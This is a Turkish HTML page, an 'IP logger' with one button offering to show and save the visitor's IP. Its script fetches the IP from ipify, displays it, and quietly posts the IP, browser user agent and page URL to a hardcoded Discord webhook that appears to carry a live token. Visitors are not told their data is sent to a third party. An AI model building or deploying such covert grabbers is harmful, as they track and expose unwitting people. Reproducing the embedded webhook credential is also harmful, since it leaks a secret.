<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Kaydedici - Buton</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: system-ui, -apple-system, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            gap: 2rem;
        }

        .center-button {
            background: white;
            color: #764ba2;
            font-size: 1.5rem;
            font-weight: bold;
            padding: 1rem 2.5rem;
            border: none;
            border-radius: 3rem;
            cursor: pointer;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .center-button:hover {
            transform: scale(1.05);
            box-shadow: 0 15px 40px rgba(0,0,0,0.3);
        }

        .center-button:active {
            transform: scale(0.98);
        }

        .ip-box {
            background: rgba(255,255,255,0.9);
            backdrop-filter: blur(10px);
            padding: 1rem 2rem;
            border-radius: 1rem;
            font-size: 1.2rem;
            font-weight: bold;
            color: #333;
            display: none;
            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
            border: 1px solid white;
        }

        .ip-box.show {
            display: block;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
    </style>
</head>
<body>
    <button class="center-button" id="ipButton">
        📍 IP'mi Göster ve Kaydet
    </button>

    <div class="ip-box" id="ipBox">
        🔍 IP adresin: <span id="ipAddress">Yükleniyor...</span>
    </div>

    <script>
        // ⚠️ KENDİ WEBHOOK URL'İNİ BURAYA YAPışTIR ⚠️
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1507729399804461176/C1wCXFO1gBKKSYhYe1YaIVkG4R1ui2ocjleGoFFfeb4drrqKVwnuj2T0N0a03lLO_hjz";

        const button = document.getElementById('ipButton');
        const ipBox = document.getElementById('ipBox');
        const ipSpan = document.getElementById('ipAddress');

        // Discord'a IP gönder
        async function sendIPToDiscord(ip, userAgent) {
            const embed = {
                title: "🔔 Yeni IP Kaydedildi!",
                color: 0x5865F2, // Discord mavisi
                fields: [
                    {
                        name: "🌐 IP Adresi",
                        value: `\`${ip}\``,
                        inline: true
                    },
                    {
                        name: "💻 Tarayıcı / Cihaz",
                        value: userAgent.substring(0, 100),
                        inline: false
                    },
                    {
                        name: "📅 Tarih",
                        value: new Date().toLocaleString('tr-TR'),
                        inline: true
                    },
                    {
                        name: "🔗 Sayfa",
                        value: window.location.href,
                        inline: false
                    }
                ],
                footer: {
                    text: "Butonlu IP Kaydedici"
                },
                timestamp: new Date().toISOString()
            };

            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: "@everyone Yeni bir ziyaretçi butona tıkladı!",
                        embeds: [embed]
                    })
                });
                console.log('✅ IP Discord\'a gönderildi');
                return true;
            } catch(hata) {
                console.error('❌ Discord\'a gönderilemedi:', hata);
                return false;
            }
        }

        // Butona tıklanınca
        button.addEventListener('click', async () => {
            try {
                ipSpan.textContent = 'Alınıyor...';
                ipBox.classList.add('show');
                
                // 1. IP'yi al
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;
                const userAgent = navigator.userAgent;
                
                // 2. Ekranda göster
                ipSpan.textContent = ip;
                
                // 3. Discord'a gönder (sana bildirim gelsin)
                await sendIPToDiscord(ip, userAgent);
                
                // 4. Kullanıcıya bilgi ver
                ipSpan.style.color = "#10b981";
                setTimeout(() => {
                    ipSpan.style.color = "#333";
                }, 2000);
                
            } catch (hata) {
                ipSpan.textContent = 'Hata oluştu! Tekrar dene.';
                console.error(hata);
            }
        });
    </script>
</body>
</html>
